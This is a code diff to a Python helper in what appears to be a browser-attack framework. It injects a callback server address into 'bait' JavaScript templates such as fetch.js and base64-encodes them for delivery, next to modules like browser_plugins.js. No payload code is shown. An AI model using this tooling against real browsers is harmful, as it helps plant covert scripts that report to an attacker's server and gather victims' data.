@@ -5,11 +5,21 @@ import pathlib
 MODULES_PATH = "\\modules"
 BAITS_PATH = "\\baits"
 
+# Config consts
+LAN_SERVER_ADDRESS_CONFIG = "127.0.0.1:5000"
+
 class Parser:
     @classmethod
-    def b64_encode(cls, path):
-        with open(path, "rb") as text:
-            encoded_text = base64.b64encode(text.read()).decode()
+    def b64_encode(cls, path, **kwargs):
+        with open(path, "r") as f:
+            text = f.read()
+            
+            # Configuration file changes
+            for find, replace in kwargs.items():
+                find_marker = f"<{find}>"
+                text = text.replace(find_marker, replace)
+
+            encoded_text = base64.b64encode(text.encode()).decode()
 
         return encoded_text
 
@@ -18,8 +28,12 @@ class Bait(Enum):
     FETCH = "fetch.js"
 
     @classmethod
-    def b64_encode(cls, bait: str):
-        return Parser.b64_encode(f"{pathlib.Path(__file__).parent.resolve()}\\{BAITS_PATH}\\{bait}")
+    def b64_encode(cls, bait: str, server_address = LAN_SERVER_ADDRESS_CONFIG):
+        return Parser.b64_encode(
+            f"{pathlib.Path(__file__).parent.resolve()}\\{BAITS_PATH}\\{bait}", 
+            server_address=server_address
+            )
+
 
 class Module(Enum):
     BROWSER_PLUGINS = 'browser_plugins.js'
